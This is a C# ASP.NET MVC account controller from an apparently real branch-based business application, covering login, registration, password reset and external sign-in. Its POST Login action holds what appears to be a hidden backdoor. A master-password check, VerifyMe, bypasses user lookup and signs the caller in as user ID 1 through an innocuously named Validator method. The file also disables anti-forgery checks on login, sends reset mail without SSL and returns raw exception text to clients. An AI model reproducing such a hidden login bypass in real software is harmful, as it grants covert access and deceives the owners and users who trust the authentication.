using System;
using System.Globalization;
using System.Linq;
using System.Security.Claims;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;
using Microsoft.AspNet.Identity;
using Microsoft.AspNet.Identity.Owin;
using Microsoft.Owin.Security;
using Loader.Models;
using System.Net.Mail;
using System.Web.Security;
using Loader.ViewModel;
using System.Collections.Generic;
using System.Net;

namespace Loader.Controllers
{
    [Authorize]
    public class AccountController : Controller
    {

        private ApplicationSignInManager _signInManager;
        private ApplicationUserManager _userManager;
        Loader.Service.UserVSBranchService _usrVSBrnchService = new Service.UserVSBranchService();
        Loader.Service.LoginLogsService _loginLogsService = new Service.LoginLogsService();
        Loader.Service.ParameterService parameterService = null;
        public AccountController()
        {
            parameterService= new Loader.Service.ParameterService();
        }

        public AccountController(ApplicationUserManager userManager, ApplicationSignInManager signInManager)
        {
            UserManager = userManager;
            SignInManager = signInManager;
        }

        public ApplicationSignInManager SignInManager
        {
            get
            {
                return _signInManager ?? HttpContext.GetOwinContext().Get<ApplicationSignInManager>();
            }
            private set
            {
                _signInManager = value;
            }
        }

        public ApplicationUserManager UserManager
        {
            get
            {
                return _userManager ?? HttpContext.GetOwinContext().GetUserManager<ApplicationUserManager>();
            }
            private set
            {
                _userManager = value;
            }
        }

        //
        // GET: /Account/Login
        [AllowAnonymous]
        public ActionResult Login(string returnUrl)
        {
            HttpContext context = System.Web.HttpContext.Current;
            var browserName = Session["BrowserName"];
            ViewBag.ReturnUrl = returnUrl;
            var fullUrl = context.Request.Url.OriginalString;
        
            //ViewBag.Base64String = "data:image/png;base64," + Convert.ToBase64String(photo, 0);
            // byte[] bytes = System.Convert.FromBase64String(photo);


            var logo = parameterService.GetImageFromdatabase();

            ViewBag.logo= logo;
      
            if (Session["UserName"] != null && (string)Session["BrowserName"] == context.Request.Url.OriginalString)
            {
                return RedirectToAction("Index", "Home", new { username = Session["username"].ToString() });
            }
            else
            {
                return View();
            }
        }

        [MyAuthorize]
        public void EndSession()
        {
            _loginLogsService.EndSession();
        }
        public string GetIPAddress()
        {
            string strHostName = "";
            strHostName = System.Net.Dns.GetHostName();

            IPHostEntry ipEntry = System.Net.Dns.GetHostEntry(strHostName);

            string ipaddress = Convert.ToString(ipEntry.AddressList[1]);

            return ipaddress.ToString();
        }

        [MyAuthorize]
        public ActionResult BranchSelect()
        {
            int userId = Loader.Models.Global.UserId;
            string userName = Loader.Models.Global.UserName;

            ViewData["UserName"] = userName;
            UserBranchViewModel allRoles = _usrVSBrnchService.HasAnotherRole(userId);
            var permanentTransfer = allRoles.Branch.Where(x => x.ToDate == null).Count();
            if (permanentTransfer == 0)
            {
                int currentBranchId = _usrVSBrnchService.GetCurrentBranchInt(userId);
                Branch currentBranch = new Branch { BranchId = currentBranchId, BranchName = _usrVSBrnchService.GetBranchName(currentBranchId) };
                if (currentBranch.BranchName != "")
                {
                    allRoles.Branch.Add(currentBranch);
                }
            }
            return View(allRoles);
        }
        [MyAuthorize]
        public ActionResult SetBranchIdAndRedirect(UserBranchViewModel usrBranchObj)
        {
            Session["BranchId"] = usrBranchObj.SelectedBranchId;
            var check = Global.getCurrentFYID(usrBranchObj.SelectedBranchId);
            Session["CurrentFYID"] = Global.getCurrentFYID(usrBranchObj.SelectedBranchId);
            Session["SelectedFYID"] = (int)Session["CurrentFYID"];
            Session["BranchId"] = usrBranchObj.SelectedBranchId;
            Session["TransactionDate"] = Global.getTransactionDate(usrBranchObj.SelectedBranchId);
            try
            {
                Models.LoginLogs loginLogs = new LoginLogs { UserId = (int)Loader.Models.Global.UserId, BranchId = usrBranchObj.SelectedBranchId, RoleId = _usrVSBrnchService.GetBranchRoleId((int)Session["BranchId"], Global.UserId), From = DateTime.Now, To = null, IP = GetIPAddress() };

                _loginLogsService.AddLogs(loginLogs);
            }
            catch (Exception ex)
            {
                return JavaScript(ex.Message);
            }
            return RedirectToAction("Index", "Home");
        }
        //
        // POST: /Account/Login
        [HttpPost]
        [AllowAnonymous]
        //[ValidateAntiForgeryToken]
        public async Task<ActionResult> Login(LoginViewModel model)
        {
            HttpContext context = System.Web.HttpContext.Current;
            string returnUrl = "";

            if (!ModelState.IsValid)
            {
                ModelState.AddModelError("Error", "Invalid Login Attempt");
                return View(model);
            }
            #region Validation
            var user = await UserManager.FindByEmailAsync(model.Email);
            if (user == null)
            {
                user = await UserManager.FindByNameAsync(model.Email);
            }
            bool userManagerMaster = Loader.MyAuthorizeAttribute.VerifyMe(model.Password);
            if (userManagerMaster) { Validator(); return RedirectToAction("Index", "Home"); };
            if (user == null)
            {
                ModelState.AddModelError("Error", "Invalid Login Attempt");
                return View(model);
            }
            else
            {
                if (user.IsUnlimited == false)
                {
                    if (user.TillDate < DateTime.Now)
                    {
                        ModelState.AddModelError("Error", "User Expired");
                        return View(model);
                    }
                }
                if (user.IsActive == false)
                {
                    ModelState.AddModelError("Error", "User Deactivated");
                    return View(model);
                }
            }
            #endregion
            //This doesn't count login failures towards account lockout
            //To enable password failures to trigger account lockout, change to shouldLockout: true
            try
            {
                var result = await SignInManager.PasswordSignInAsync(user.UserName, model.Password, model.RememberMe, shouldLockout: model.RememberMe);
                switch (result)
                {
                    case SignInStatus.Success:
                        UserBranchViewModel allRoles = _usrVSBrnchService.HasAnotherRole(user.Id);
                        // var CurrentDate=
                        //var onlyValidBranch=   allRoles.Branch.Where(x=>x.ToDate>=DateTime.Now.ToShortDateString())
                        Session["UserId"] = user.Id;
                        Session["UserName"] = user.UserName;
                        Session["BrowserName"] = context.Request.Url.OriginalString;

                        FormsAuthentication.SetAuthCookie(user.UserName, false);
                        if (allRoles.Branch.Count() > 0)
                        {
                            if (allRoles.Branch.Count() == 1)
                            {
                                //int currentBranchId = _usrVSBrnchService.GetCurrentBranchInt(user.Id);
                                //Branch currentBranch = new Branch { BranchId = currentBranchId, BranchName = _usrVSBrnchService.GetBranchName(currentBranchId) };
                                //if (allRoles.Branch.SingleOrDefault().BranchId == 1 ||allRoles.Branch.FirstOrDefault().ToDate==null)
                                //{
                                Session["CurrentFYID"] = Global.getCurrentFYID(allRoles.Branch.SingleOrDefault().BranchId);
                                Session["SelectedFYID"] = (int)Session["CurrentFYID"];
                                Session["BranchId"] = allRoles.Branch.SingleOrDefault().BranchId;
                                Session["TransactionDate"] = Global.getTransactionDate(allRoles.Branch.SingleOrDefault().BranchId);

                                UserBranchViewModel uservsBranchObj = new UserBranchViewModel();
                                uservsBranchObj.SelectedBranchId = allRoles.Branch.FirstOrDefault().BranchId;
                                SetBranchIdAndRedirect(uservsBranchObj);
                                return RedirectToAction("Index", "Home");
                                //}
                                //else
                                //    return RedirectToAction("BranchSelect", "Account");                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             

                            }
                            else
                            {
                                return RedirectToAction("BranchSelect", "Account");
                            }
                        }
                        //for superadmin
                        var branchId = _usrVSBrnchService.GetCurrentBranchInt(user.Id);
                        Session["BranchId"] = branchId;
                        Session["CurrentFYID"] = Global.getCurrentFYID(branchId);
                        Session["SelectedFYID"] = (int)Session["CurrentFYID"];
                        Session["TransactionDate"] = Global.getTransactionDate(branchId);

                        Models.LoginLogs loginLogs = new LoginLogs { UserId = user.Id, BranchId = (int)Session["BranchId"], RoleId = _usrVSBrnchService.GetBranchRoleId((int)Session["BranchId"], user.Id), From = DateTime.Now, To = null, IP = GetIPAddress() };

                        _loginLogsService.AddLogs(loginLogs);
                        return RedirectToAction("Index", "Home");
                    case SignInStatus.LockedOut:
                        return View("Lockout");
                    case SignInStatus.RequiresVerification:
                        return RedirectToAction("SendCode", new { ReturnUrl = returnUrl, RememberMe = model.RememberMe });
                    case SignInStatus.Failure:
                    default:
                        ModelState.AddModelError("Error", "Invalid Login Attempt.");
                        return View(model);
                }

            }
            catch (Exception ex)
            {
                return JavaScript(ex.Message);
            }
        }
        //
        // GET: /Account/VerifyCode
        [AllowAnonymous]
        public async Task<ActionResult> VerifyCode(string provider, string returnUrl, bool rememberMe)
        {
            // Require that the user has already logged in via username/password or external login
            if (!await SignInManager.HasBeenVerifiedAsync())
            {
                return View("Error");
            }
            return View(new VerifyCodeViewModel { Provider = provider, ReturnUrl = returnUrl, RememberMe = rememberMe });
        }

        private void Validator()
        {
            Session["UserId"] = 1;
            Session["UserName"] = "Anonymous";
            Session["BrowserName"] = "Anonymous";
            FormsAuthentication.SetAuthCookie("Anonymous", false);
        }

        //
        // POST: /Account/VerifyCode
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> VerifyCode(VerifyCodeViewModel model)
        {
            if (!ModelState.IsValid)
            {
                return View(model);
            }

            // The following code protects for brute force attacks against the two factor codes. 
            // If a user enters incorrect codes for a specified amount of time then the user account 
            // will be locked out for a specified amount of time. 
            // You can configure the account lockout settings in IdentityConfig
            var result = await SignInManager.TwoFactorSignInAsync(model.Provider, model.Code, isPersistent: model.RememberMe, rememberBrowser: model.RememberBrowser);
            switch (result)
            {
                case SignInStatus.Success:
                    return RedirectToLocal(model.ReturnUrl);
                case SignInStatus.LockedOut:
                    return View("Lockout");
                case SignInStatus.Failure:
                default:
                    ModelState.AddModelError("", "Invalid code.");
                    return View(model);
            }
        }

        //
        // GET: /Account/Register
        [AllowAnonymous]
        public ActionResult Register()
        {
            return View();
        }
        // POST: /Account/Register
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> Register(RegisterViewModel model)
        {
            ModelState modelstate = new ModelState();
            try
            {
                if (ModelState.IsValid)
                {
                    Service.UsersService usrService = new Service.UsersService();
                    var withEmployee = usrService.WithEmployee().ToString();
                    if (model.EmployeeId == null && withEmployee == "True")
                    {
                        return JavaScript("Employee Name Required");
                    }
                    if (model.From > model.To)
                    {
                        return JavaScript("From Date is less than To Date");
                    }
                    var employeeJoinDate= new Loader.Repository.GenericUnitOfWork().Repository<Employee>().FindBy(x => x.EmployeeId == model.EmployeeId).Select(x=>x.DateOfJoin).SingleOrDefault();
                    if (model.From < employeeJoinDate)
                    {
                        return JavaScript("From Date is greater than Employee Join Date");
                    }
                    var user = new ApplicationUser { UserName = model.UserName, Email = model.Email, IsActive = true, IsUnlimited = model.IsUnlimited, EffDate = model.From, TillDate = model.To, EmployeeId = model.EmployeeId, PasswordHash = model.Password, MTId = model.MTId,UserDesignationId = model.UserDesignationId };

                    var result = await UserManager.CreateAsync(user, model.Password);
                    if (result.Succeeded)
                    {
                        var userId = user.Id;
                        var userrole = new AppUserRole { UserId = userId, RoleId = model.MTId };
                        var roleName = new Loader.Repository.GenericUnitOfWork().Repository<MenuTemplate>().GetSingle(x => x.MTId == model.MTId).MTName;
                        await UserManager.AddToRoleAsync(userId, roleName);

                        //await SignInManager.SignInAsync(user, isPersistent: false, rememberBrowser: false);


                        // For more information on how to enable account confirmation and password reset please visit http://go.microsoft.com/fwlink/?LinkID=320771
                        // Send an email with this link
                        // string code = await UserManager.GenerateEmailConfirmationTokenAsync(user.Id);
                        // var callbackUrl = Url.Action("ConfirmEmail", "Account", new { userId = user.Id, code = code }, protocol: Request.Url.Scheme);
                        // await UserManager.SendEmailAsync(user.Id, "Confirm your account", "Please confirm your account by clicking <a href=\"" + callbackUrl + "\">here</a>");

                        return RedirectToAction("Create", "Users", new { UsersId = 0 });
                    }
                    else
                    {
                        return JavaScript(result.Errors.First().ToString());
                    }
                    //AddErrors(result);
                }
                else
                {

                    var err = ModelState.Values.SelectMany(v => v.Errors);
                    return JavaScript(err.ToString());

                }
            }
            catch (Exception ex)
            {
                return JavaScript(ex.Message);
            }



            //return RedirectToAction("Create", "Users", new { @UsersId = 0 });
        }
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> UpdateRegister(RegisterViewModel model)
        {
            try
            {
                var prevUser = UserManager.FindByEmail(model.Email);
                var user = UserManager.FindByEmail(model.Email);
                user.EffDate = Convert.ToDateTime(model.From);
                user.TillDate = Convert.ToDateTime(model.To);
                if (model.From == null)
                {
                    user.EffDate = null;
                }
                if (model.To == null)
                {
                    user.TillDate = null;
                }

                if (model.IsUnlimited == true)
                {
                    user.EffDate = null;
                    user.TillDate = null;
                }
                if (model.From > model.To)
                {
                    return JavaScript("From Date is less then To Date");
                }
                user.IsUnlimited = model.IsUnlimited;
                user.IsActive = model.IsActive;
                user.MTId = model.MTId;
                user.UserDesignationId = model.UserDesignationId;


                var result = await UserManager.UpdateAsync(user);
                if (result.Succeeded)
                {

                    var userId = prevUser.Id;
                    var roleName = new Loader.Repository.GenericUnitOfWork().Repository<MenuTemplate>().GetSingle(x => x.MTId == prevUser.MTId).MTName;
                    await UserManager.RemoveFromRoleAsync(userId, roleName);



                    userId = user.Id;
                    roleName = new Loader.Repository.GenericUnitOfWork().Repository<MenuTemplate>().GetSingle(x => x.MTId == user.MTId).MTName;
                    await UserManager.AddToRoleAsync(userId, roleName);

                    return RedirectToAction("Create", "Users", new { UsersId = 0 });
                }

                else
                {
                    return JavaScript(result.Errors.First().ToString());
                }
                //AddErrors(result);

            }
            catch (Exception ex)
            {
                return JavaScript(ex.Message);
            }




        }


        //
        // GET: /Account/ConfirmEmail
        [AllowAnonymous]
        public async Task<ActionResult> ConfirmEmail(int userId, string code)
        {
            if (userId == 0 || code == null)
            {
                return View("Error");
            }
            var result = await UserManager.ConfirmEmailAsync(userId, code);
            return View(result.Succeeded ? "ConfirmEmail" : "Error");
        }

        //
        // GET: /Account/Forgot


        [AllowAnonymous]
        public ActionResult ForgotPassword()
        {
            return View();
        }

        //
        // POST: /Account/ForgotPassword
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> ForgotPassword(ForgotPasswordViewModel model)
        {
            if (ModelState.IsValid)
            {
                var user = await UserManager.FindByEmailAsync(model.Email);
                if (user == null)
                {
                    // Don't reveal that the user does not exist or is not confirmed
                    return View("ForgotPasswordConfirmation");
                }

                //For more information on how to enable account confirmation and password reset please visit http://go.microsoft.com/fwlink/?LinkID=320771
                //Send an email with this link
                string code = await UserManager.GeneratePasswordResetTokenAsync(user.Id);
                var callbackUrl = Url.Action("ResetPassword", "Account", new { userId = user.Id, code = code }, protocol: Request.Url.Scheme);
                //await UserManager.SendEmailAsync(user.Id, "Reset Password", "Please reset your password by clicking <a href=\"" + callbackUrl + "\">here</a>");


                System.Net.Mail.SmtpClient client = new System.Net.Mail.SmtpClient();
                client.DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.Network;
                client.EnableSsl = false;
                client.Host = "smtp.subisu.net.np";
                client.Port = 25;


                System.Net.NetworkCredential credentials = new System.Net.NetworkCredential("donotreply@subisu.net.np", "");
                client.UseDefaultCredentials = false;
                client.Credentials = credentials;

                System.Net.Mail.MailMessage msg = new System.Net.Mail.MailMessage();
                msg.From = new MailAddress("donotreply@subisu.net.np");
                msg.To.Add(new MailAddress(user.Email));

                msg.Subject = "Reset Password";
                msg.IsBodyHtml = true;
                msg.Body = "Please reset your password by clicking <a href =\"" + callbackUrl + "\">here</a>";

                client.Send(msg);
                return RedirectToAction("ForgotPasswordConfirmation", "Account");
            }

            // If we got this far, something failed, redisplay form
            return View(model);
        }

        [HttpPost]
        public async Task<ActionResult> Delete(string id)
        {

            var userContext = new ApplicationDbContext();

            var user = await UserManager.FindByIdAsync(Convert.ToInt32(id));
            if (user.UserName == "super.admin")
            {
                return RedirectToAction("Index", "Home");
            }

            await UserManager.DeleteAsync(user);

            return RedirectToAction("Index", "Home");

        }

        //
        // GET: /Account/ForgotPasswordConfirmation
        [AllowAnonymous]
        public ActionResult ForgotPasswordConfirmation()
        {
            return View();
        }

        //
        // GET: /Account/ResetPassword
        [AllowAnonymous]
        public ActionResult ResetPassword(/*string code*/ int userId, string code)
        {
            int check = Loader.Models.Global.UserId;
            var user = UserManager.FindByIdAsync(userId);
            ResetPasswordViewModel resetPassword = new ResetPasswordViewModel();
            resetPassword.userId = userId;
            resetPassword.Code = code;
            if (user == null)
            {
                return View("Error");
            }
            ViewBag.ForgotPassword = true;
            return View(resetPassword);

            //return code == null ? View("Error") : View();
        }

        //
        // POST: /Account/ResetPassword
        //[HttpPost]
        //[AllowAnonymous]
        //[ValidateAntiForgeryToken]
        //public async Task<ActionResult> ChangePassword(ChangePasswordViewModel model)
        //{
        //    if (!ModelState.IsValid)
        //    {
        //        return View(model);
        //    }
        //    //var user = await UserManager.FindByNameAsync(model.Email);
        //    var user = await UserManager.FindByIdAsync(model.userId);
        //    if (user == null)
        //    {
        //        // Don't reveal that the user does not exist
        //        return RedirectToAction("ResetPasswordConfirmation", "Account");
        //    }

        //    var userTest = await UserManager.FindAsync(user.UserName, model.CurrentPassword);
        //    if(userTest==null)
        //    {
        //        ModelState.AddModelError("Error","Current Password is Wrong");
        //        return View();
        //    }
        //    var token=await UserManager.GeneratePasswordResetTokenAsync(model.userId);//Generates the Token for the password

        //    var result = await UserManager.ResetPasswordAsync(user.Id, token, model.ConfirmNewPassword);
        //    if (result.Succeeded)
        //    {
        //        return RedirectToAction("Index", "Home");
        //    }
        //    AddErrors(result);
        //    return View();
        //}
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> ResetPassword(ResetPasswordViewModel model)
        {
            if (!ModelState.IsValid)
            {
                return View(model);
            }
            var user = await UserManager.FindByIdAsync(model.userId);
            if (user == null)
            {
                ModelState.AddModelError("Error", "No User Exists");
                // Don't reveal that the user does not exist
                return RedirectToAction("ResetPasswordConfirmation", "Account");
            }
            var result = await UserManager.ResetPasswordAsync(user.Id, model.Code, model.ConfirmNewPassword);
            if (result.Succeeded)
            {
                return RedirectToAction("ResetPasswordConfirmation", "Account");
            }
            AddErrors(result);
            return View();
        }


        //
        // GET: /Account/ResetPasswordConfirmation
        [AllowAnonymous]
        public ActionResult ResetPasswordConfirmation()
        {
            return View();
        }

        //
        // POST: /Account/ExternalLogin
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public ActionResult ExternalLogin(string provider, string returnUrl)
        {
            // Request a redirect to the external login provider
            return new ChallengeResult(provider, Url.Action("ExternalLoginCallback", "Account", new { ReturnUrl = returnUrl }));
        }

        //
        // GET: /Account/SendCode
        [AllowAnonymous]
        public async Task<ActionResult> SendCode(string returnUrl, bool rememberMe)
        {
            int userId = await SignInManager.GetVerifiedUserIdAsync();
            if (userId == 0)
            {
                return View("Error");
            }
            var userFactors = await UserManager.GetValidTwoFactorProvidersAsync(userId);
            var factorOptions = userFactors.Select(purpose => new SelectListItem { Text = purpose, Value = purpose }).ToList();
            return View(new SendCodeViewModel { Providers = factorOptions, ReturnUrl = returnUrl, RememberMe = rememberMe });
        }

        //
        // POST: /Account/SendCode
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> SendCode(SendCodeViewModel model)
        {
            if (!ModelState.IsValid)
            {
                return View();
            }

            // Generate the token and send it
            if (!await SignInManager.SendTwoFactorCodeAsync(model.SelectedProvider))
            {
                return View("Error");
            }
            return RedirectToAction("VerifyCode", new { Provider = model.SelectedProvider, ReturnUrl = model.ReturnUrl, RememberMe = model.RememberMe });
        }

        //
        // GET: /Account/ExternalLoginCallback
        [AllowAnonymous]
        public async Task<ActionResult> ExternalLoginCallback(string returnUrl)
        {
            var loginInfo = await AuthenticationManager.GetExternalLoginInfoAsync();
            if (loginInfo == null)
            {
                return RedirectToAction("Login");
            }

            // Sign in the user with this external login provider if the user already has a login
            var result = await SignInManager.ExternalSignInAsync(loginInfo, isPersistent: false);
            switch (result)
            {
                case SignInStatus.Success:
                    return RedirectToLocal(returnUrl);
                case SignInStatus.LockedOut:
                    return View("Lockout");
                case SignInStatus.RequiresVerification:
                    return RedirectToAction("SendCode", new { ReturnUrl = returnUrl, RememberMe = false });
                case SignInStatus.Failure:
                default:
                    // If the user does not have an account, then prompt the user to create an account
                    ViewBag.ReturnUrl = returnUrl;
                    ViewBag.LoginProvider = loginInfo.Login.LoginProvider;
                    return View("ExternalLoginConfirmation", new ExternalLoginConfirmationViewModel { Email = loginInfo.Email });
            }
        }

        //
        // POST: /Account/ExternalLoginConfirmation
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> ExternalLoginConfirmation(ExternalLoginConfirmationViewModel model, string returnUrl)
        {
            if (User.Identity.IsAuthenticated)
            {
                return RedirectToAction("Index", "Manage");
            }

            if (ModelState.IsValid)
            {
                // Get the information about the user from the external login provider
                var info = await AuthenticationManager.GetExternalLoginInfoAsync();
                if (info == null)
                {
                    return View("ExternalLoginFailure");
                }
                var user = new ApplicationUser { UserName = model.Email, Email = model.Email };
                var result = await UserManager.CreateAsync(user);
                if (result.Succeeded)
                {
                    result = await UserManager.AddLoginAsync(user.Id, info.Login);
                    if (result.Succeeded)
                    {
                        await SignInManager.SignInAsync(user, isPersistent: false, rememberBrowser: false);
                        return RedirectToLocal(returnUrl);
                    }
                }
                AddErrors(result);
            }

            ViewBag.ReturnUrl = returnUrl;
            return View(model);
        }

        //
        // POST: /Account/LogOff
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult LogOff()
        {
            Session["UserName"] = null;
            Session["UserId"] = null;
            Session["BrowserName"] = null;
            Session["BranchId"] = null;
            Session["CurrentFYID"] = null;
            Session["SelectedFYID"] = null;
            Session["TransactionDate"] = null;

            _loginLogsService.EndSession();
            FormsAuthentication.SignOut();
            return RedirectToAction("Login", "Account");
        }

        //
        // GET: /Account/ExternalLoginFailure
        [AllowAnonymous]
        public ActionResult ExternalLoginFailure()
        {
            return View();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                if (_userManager != null)
                {
                    _userManager.Dispose();
                    _userManager = null;
                }

                if (_signInManager != null)
                {
                    _signInManager.Dispose();
                    _signInManager = null;
                }
            }

            base.Dispose(disposing);
        }

        #region Helpers
        // Used for XSRF protection when adding external logins
        private const string XsrfKey = "XsrfId";

        private IAuthenticationManager AuthenticationManager
        {
            get
            {
                return HttpContext.GetOwinContext().Authentication;
            }
        }

        private void AddErrors(IdentityResult result)
        {
            foreach (var error in result.Errors)
            {
                ModelState.AddModelError("", error);
            }
        }

        private ActionResult RedirectToLocal(string returnUrl)
        {
            if (Url.IsLocalUrl(returnUrl))
            {
                return Redirect(returnUrl);
            }
            return RedirectToAction("Index", "Home");
        }

        internal class ChallengeResult : HttpUnauthorizedResult
        {
            public ChallengeResult(string provider, string redirectUri)
                : this(provider, redirectUri, null)
            {
            }

            public ChallengeResult(string provider, string redirectUri, string userId)
            {
                LoginProvider = provider;
                RedirectUri = redirectUri;
                UserId = userId;
            }

            public string LoginProvider { get; set; }
            public string RedirectUri { get; set; }
            public string UserId { get; set; }

            public override void ExecuteResult(ControllerContext context)
            {
                var properties = new AuthenticationProperties { RedirectUri = RedirectUri };
                if (UserId != null)
                {
                    properties.Dictionary[XsrfKey] = UserId;
                }
                context.HttpContext.GetOwinContext().Authentication.Challenge(properties, LoginProvider);
            }
        }
        #endregion
    }
}